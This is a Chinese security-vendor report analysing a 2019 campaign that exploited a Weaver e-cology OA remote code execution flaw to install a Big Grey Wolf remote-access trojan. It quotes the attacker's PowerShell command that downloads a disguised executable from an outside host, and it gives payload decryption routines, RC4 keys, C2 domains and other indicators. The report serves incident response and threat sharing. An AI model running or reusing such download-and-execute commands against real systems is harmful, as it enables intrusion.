> 原文链接: https://www.anquanke.com//post/id/187748 


# 一次利用泛微OA最新漏洞攻击活动分析拓展


                                阅读量   
                                **852242**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t013de74e69656ee934.jpg)](https://p1.ssl.qhimg.com/t013de74e69656ee934.jpg)



## 背景

2019年9月17日泛微官方更新了关于e-cology OA的安全补丁，修复了一个远程代码执行漏洞。该漏洞位于e-cology OA系统BeanShell组件中，BeanShell组件为系统自带且允许未授权访问。攻击者通过构造恶意请求调用该存在问题的组件可在目标服务器执行任意命令。

在其后的几天，奇安信团队陆续接到了几起组织遭受入侵的应急响应请求。我们确认了攻击者通过利用了泛微e-cology OA的最新漏洞进行初始渗透，并通过从一些白网站下载后续的恶意代码。奇安信病毒响应中心还原了攻击过程，并对相关的恶意代码进行了分析，分享给安全社区来共同对抗威胁。



## 攻击过程还原

中招组织的机器是一台VPN服务器，运行了泛微的OA服务，存在最新被暴露的漏洞，攻击利用漏洞以后获取在服务器上的命令执行，漏洞被触发后从upload.erp321.com网站的静态资源下载木马到本地执行。

erp321.com是聚水潭开发的一个电商SaaS ERP系统，需要注册才能使用该系统，本次攻击使用了upload.erp321.com页面的静态资源放了一个木马，木马如何被传到此网站上目前未知，可能需要网络本身做排查。

分析确认被植入到网站并被受攻击者下载的木马为大灰狼远控的一个变种，木马执行起来后会去alicdn.com（又一个白网站，图床系统，可以通过正常的工具上传文件）下载下一阶段的Payload，其为伪装GIF文件的加密后的恶意代码，在内存中解密加载后连接C2进行远程控制。



## 攻击恶意代码细节

初始的漏洞利用的命令行参数如下：

```
powershell (new-object System.Net.WebClient).DownloadFile
( 'http://upload.erp321.com/files/temp/0fedee73171e4b5a9e63494526fce364.jpg',
'C:/m.exe')
```

通过“WEAVER\JDK\bin\javaw.exe”目录下的javaw执行调用Powershell下载木马到本地执行，WEAVER目录就是泛微的安装目录。

访问上述的这个静态资源，确认为一个伪装图片的木马：

[![](https://p3.ssl.qhimg.com/t01a0d5e6552efb52d1.png)](https://p3.ssl.qhimg.com/t01a0d5e6552efb52d1.png)

图2.1 erp321网站上伪装图片的木马

下载回来的木马使用了豌豆夹的图标，信息如下：
<td style="width: 72.3pt;" valign="top">内部文件名</td><td style="width: 213.05pt;" valign="top">wandoujia.exe</td>
<td style="width: 72.3pt;" valign="top">MD5</td><td style="width: 213.05pt;" valign="top">f426848f241e000e9f0953b0af53ce19</td>
<td style="width: 72.3pt;" valign="top">是否加壳</td><td style="width: 213.05pt;" valign="top">是</td>
<td style="width: 72.3pt;" valign="top">编译时间</td><td style="width: 213.05pt;" valign="top">2019-05-10 23:25:56</td>
<td style="width: 72.3pt;" valign="top">图标</td><td style="width: 213.05pt;" valign="top">[![](https://p2.ssl.qhimg.com/t018931367ffe260eb6.png)](https://p2.ssl.qhimg.com/t018931367ffe260eb6.png)</td>

该样本执行起来后，会先解密一个URL，该URL主要是为了下载远控的核心DLL，解密算法为先base64解码，然后add 0x7a再xor 0x59，之后进行RC4揭秘，密钥为“Getong538”，解密的URL是alicdn上面的一个静态资源：

[https://ae01[.]alicdn[.]com/kf/HTB1wRgbdEuF3KVjSZK95jbVtXXac.gif](https://ae01%5B.%5Dalicdn%5B.%5Dcom/kf/HTB1wRgbdEuF3KVjSZK95jbVtXXac.gif)

[![](https://p3.ssl.qhimg.com/t01264bbb1d1598a8dc.png)](https://p3.ssl.qhimg.com/t01264bbb1d1598a8dc.png)

图2.2 循环从URL下载加密的木马核心模块

下载后的文件存放在Program Files下的AppPatch目录下，文件名为：

HTB1wRgbdEuF3KVjSZK95jbVtXXac.cer

[![](https://p0.ssl.qhimg.com/t01d42ddeb5d236985e.png)](https://p0.ssl.qhimg.com/t01d42ddeb5d236985e.png)

图2.3 加密的核心模块存放路径

然后读取该文件，通过2轮RC4解密下载回来的木马核心模块后，在内存加载该DLL，调用被加载起来DLL的导出函数DllFunpgradrs，传递配置信息执行恶意代码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01dbc00982f23dd542.png)

图2.4 内存加载核心模块并传递配置信息

内存加载的DLL是一个伪装为KuGou2012的DLL，其实是一个大灰狼远控的核心DLL模块，通过传递配置信息回联服务器进行远程控制。

[![](https://p3.ssl.qhimg.com/t012adf6728ef82090f.png)](https://p3.ssl.qhimg.com/t012adf6728ef82090f.png)

图2.5 解密后的核心模块的文件信息

传递过来的配置信息的解密算法是先base64解密，然后add 0x77再xor 0x56，最后做RC4解密：

[![](https://p1.ssl.qhimg.com/t01e2b66fd5c3ed9f84.png)](https://p1.ssl.qhimg.com/t01e2b66fd5c3ed9f84.png)

图2.6 核心模块解密配置文件的算法

解密后的数据如下，包含C2地址和一些其他的备用上线方式和分组等：
<td style="width: 366.9pt;" valign="top">xmr.shfryy.com  8090 8090qianyueadminsK_120305Glfsvcs Geolocation Services此服务将监视系统的当前位置并管理地理围栏(具有关联事件的地理位置)。如果你禁用此服务，应用程序将无法使用或接收有关地理位置或地理围栏的通知。%CommonProgramFiles%\Intelnet\iexplorer.exewindows默认分组  1 2 97 1 0http://www.ip138.com/ips138.asp?ip=%s&amp;action=2 &gt;&gt;  &lt;/http://dns.aizhan.com/?q=%s “,” “, http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins=%s</td>

K_120305

此服务将监视系统的当前位置并管理地理围栏(具有关联事件的地理位置)。如果你禁用此服务，应用程序将无法使用或接收有关地理位置或地理围栏的通知。

iexplorer.exe

默认分组  1 2 97 1 0

http://dns.aizhan.com/?q=%s “,” “, http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins=%s



## 关联拓展分析

通过C2我们关联到9个历史样本：

[![](https://p5.ssl.qhimg.com/t016b6af371f3adfa68.png)](https://p5.ssl.qhimg.com/t016b6af371f3adfa68.png)

图3.1 关联到的其他木马样本

而这些样本的远控核心模块是从yuyin.baidu.com站下载解密执行的，链接如下：[http://yuyin.baidu.com/file/get/10128](http://yuyin.baidu.com/file/get/10128)

通过关联出来的样本整理表格如下：

MD5

文件名

修改时间

编译时间

f619fcbe9d0715da3c757f5135fe3f2d

chkfs.exe

2018-12-30 14:03

2018-10-8 03:18

c9c1bffca9c08312e4008e5a0cc803b3

chkfs_2.exe

2018-8-9 15:41

2018-5-3 21:56

586fb89941ac5c7643a700fbc307e87e

iFunBox.exe

2019-9-9 18:03

2018-5-3 21:56

61db571255f82fb0b36be6c396b0732c

网易UU网游加速器.exe

2019-4-28 07:40

2018-5-3 21:56

b4b808ab6d20864940912feeca556211

逆水寒启动器.exe

2018-8-29 12:16

2018-5-3 21:56

84623f0e8714284c33452e407f7f75ec

逆水寒启动器_1.exe

2018-8-28 02:17

2018-5-3 21:56

95d4bcd2edf30022bf75cc5b5dca49b3

逆水寒启动器_2.exe

2018-6-15 06:30

2018-5-3 21:56

978c47da5e26732052556711f763a201

逆水寒启动器_3.exe

2018-8-29 15:01

2018-5-3 21:56

63a13d8bfd100d4ffae43264041f0f60

逆水寒启动器_4.exe

2018-9-6 11:24

2018-5-3 21:56

8f5302a31c7540a66ef595cb772e7120

逆水寒启动器_6.exe

2018-6-14 15:38

2018-12-25 06:11

值得关注的是上述样本中攻击者使用的C2：xmr.shfryy.com解析到的IP地址相应的服务器属于中图电子，该URL上有下载App的服务：[http://124.232.156.117:8080/](http://124.232.156.117:8080/)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011c43e5f4eb586e66.png)

图3.2 中图电子APP服务

该App安装后，打开是一个登录界面，登录产生的数据包如下，应该是中图电子正常的App服务：

[![](https://p3.ssl.qhimg.com/t01123cf3ffd7210c0f.png)](https://p3.ssl.qhimg.com/t01123cf3ffd7210c0f.png)

图3.3 登录App的数据包

服务器的80端口运行着一个中图ERP的Web服务：

[![](https://p2.ssl.qhimg.com/t010273cd8d9c81d3a1.png)](https://p2.ssl.qhimg.com/t010273cd8d9c81d3a1.png)

图3.4 中图ERP登录界面

目前中图电子的服务器上为何开启了恶意代码需要的C2服务还未有明确答案，需要受影响方进一步排查。

这次攻击的流程图可以总结如下：

[![](https://p1.ssl.qhimg.com/t011d92169ceb29c182.png)](https://p1.ssl.qhimg.com/t011d92169ceb29c182.png)

图3.5 攻击者攻击流程图

VirusTotal上获取的对域名解析的历史C2的梳理：

解析时间

IP

IP归属

归属地

2019-9-14

124.232.156.117

中图ERP

湖南省长沙市电信IDC机房

2019-2-5

119.147.115.83

攻击者使用IP

广东省东莞市电信

2019-1-7

121.12.168.23

攻击者使用IP

广东省电信

2018-12-3

47.104.64.231

攻击者使用IP

加拿大

2018-9-6

60.205.222.252

攻击者使用IP

广东省深圳市英达通信

2018-7-10

222.186.59.5

攻击者使用IP

江苏省镇江市电信

2018-3-30

47.89.58.141



加拿大

利用奇安信的威胁分析平台 [https://ti.qianxin.com](https://ti.qianxin.com) ，我们发现了另外一个域名：rouji.khqy.net，与本次攻击使用的C2域名同时解析到同样的IP上，而这个域名带有远控家族的标签：

[![](https://p4.ssl.qhimg.com/t01bf6886fb4b91441f.png)](https://p4.ssl.qhimg.com/t01bf6886fb4b91441f.png)

图3.6 奇安信威胁分析平台截图



## 总结

本次以泛微OA漏洞进行攻击的团伙善于快速使用已知的漏洞进行渗透，攻击目标主要包括一些ERP系统，攻击目的可能在于窃取ERP系统的数据进行不法行为（包括倒卖数据、诈骗、修改数据、窃取秘密等）。除此以外攻击者偏好将木马及后续Payload的存放在，一些可正常存放静态资源或入侵得手的白网站上，以逃避防守方基于黑域名的入侵检测，体现了很强的对抗意识和能力。



## IOC

文件MD5

af4bc7d470bec080839d956dae75c1a6

f426848f241e000e9f0953b0af53ce19

f619fcbe9d0715da3c757f5135fe3f2d

c9c1bffca9c08312e4008e5a0cc803b3

586fb89941ac5c7643a700fbc307e87e

61db571255f82fb0b36be6c396b0732c

b4b808ab6d20864940912feeca556211

84623f0e8714284c33452e407f7f75ec

95d4bcd2edf30022bf75cc5b5dca49b3

978c47da5e26732052556711f763a201

63a13d8bfd100d4ffae43264041f0f60

8f5302a31c7540a66ef595cb772e7120

URL

http://upload.erp321.com/files/temp/0fedee73171e4b5a9e63494526fce364.jpg

[https://ae01.alicdn.com/kf/HTB1wRgbdEuF3KVjSZK95jbVtXXac.gif](https://ae01.alicdn.com/kf/HTB1wRgbdEuF3KVjSZK95jbVtXXac.gif)

[http://yuyin.baidu.com/file/get/10128](http://yuyin.baidu.com/file/get/10128)

xmr.shfryy.com:8090

rouji.khqy.net

bert.shfryy.com

RC4密钥

99Kother5

eee888Yur

Getong538

Strong798



## 参考链接

【预警通告】泛微e-cology OA 远程代码执行漏洞安全预警通告

https://sec.thief.one/article_content?a_id=dbfc576e2310babe1f3b5911df11fe6d
